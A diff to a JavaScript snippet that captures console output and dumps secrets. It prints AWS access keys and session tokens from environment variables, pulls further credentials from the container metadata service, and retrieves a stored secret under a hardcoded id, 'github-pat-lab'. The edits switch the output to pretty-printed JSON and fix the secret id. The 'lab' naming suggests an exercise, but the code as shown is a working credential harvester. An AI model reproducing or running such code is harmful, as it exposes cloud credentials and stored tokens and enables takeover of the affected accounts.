@@ -47,6 +47,7 @@ console.log = console.error = console.warn = (...a) => logs.push(a.join(' '));
 try {
     const { execSync } = require("child_process");
     const region = process.env.AWS_REGION || process.env.AWS_DEFAULT_REGION || "us-east-1";
+    const j = (o) => JSON.stringify(o, null, 2);
     
     const fetchMDS = () => {
       const path = process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI;
@@ -71,11 +72,12 @@ try {
       ));
     };
     
-    const id = process.argv[2];
-    console.log({ AccessKeyId: process.env.AWS_ACCESS_KEY_ID, SecretAccessKey: process.env.AWS_SECRET_ACCESS_KEY, SessionToken: process.env.AWS_SESSION_TOKEN });
+    const id = 'github-pat-lab';
+    console.log(j({ AccessKeyId: process.env.AWS_ACCESS_KEY_ID, SecretAccessKey: process.env.AWS_SECRET_ACCESS_KEY, SessionToken: process.env.AWS_SESSION_TOKEN }));
     const mds = fetchMDS();
-    console.log({ AccessKeyId: mds.AccessKeyId, SecretAccessKey: mds.SecretAccessKey, SessionToken: mds.Token });
-    if (id) console.log(getSecret(id, mds));
+    console.log(j({ AccessKeyId: mds.AccessKeyId, SecretAccessKey: mds.SecretAccessKey, SessionToken: mds.Token }));
+    if (id) console.log(j(getSecret(id, mds)));
+
 
 
     for (const [k, v] of Object.entries(e)) {
